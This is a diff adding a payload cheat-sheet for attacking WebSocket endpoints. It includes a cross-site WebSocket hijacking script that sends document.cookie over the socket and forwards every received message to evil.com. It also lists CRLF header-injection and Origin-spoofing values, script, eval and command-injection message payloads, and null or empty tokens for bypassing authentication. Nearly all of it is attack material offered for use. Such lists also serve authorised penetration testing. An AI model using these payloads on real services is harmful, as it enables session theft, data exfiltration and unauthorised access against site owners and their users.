@@ -1,0 +1,49 @@
+# ============================================================
+# WebSockets — Basic Attack Payloads
+# ============================================================
+
+# ---- WebSocket Handshake Headers ----
+GET /ws HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+
+# ---- CSWSH (Cross-Site WebSocket Hijacking) ----
+# WebSocket doesn't enforce CORS → can be initiated from evil.com
+<script>
+var ws = new WebSocket("wss://target.com/ws");
+ws.onopen = function() {
+    ws.send("auth:" + document.cookie);
+};
+ws.onmessage = function(event) {
+    fetch("https://evil.com/?data=" + encodeURIComponent(event.data));
+};
+</script>
+
+# ---- Header Injection in Handshake ----
+# Host header injection
+Sec-WebSocket-Protocol: chat\r\nX-Injected-Header: evil
+Origin: https://evil.com
+Sec-WebSocket-Extensions: permessage-deflate
+
+# ---- Origin Bypass ----
+Origin: null
+Origin: https://evil.com
+Origin: https://TARGET.com.evil.com
+
+# ---- Message Injection Payloads ----
+{"type":"message","data":"<script>alert(1)</script>"}
+{"action":"eval","code":"alert(document.cookie)"}
+{"cmd":"id"}
+{"method":"getUsers","params":{"role":"admin"}}
+
+# ---- Authentication Bypass ----
+# Handshake without auth token
+# Send authenticated message without valid session
+{"token":"null"}
+{"token":"undefined"}
+{"token":""}
+{"token":0}
+{"token":false}
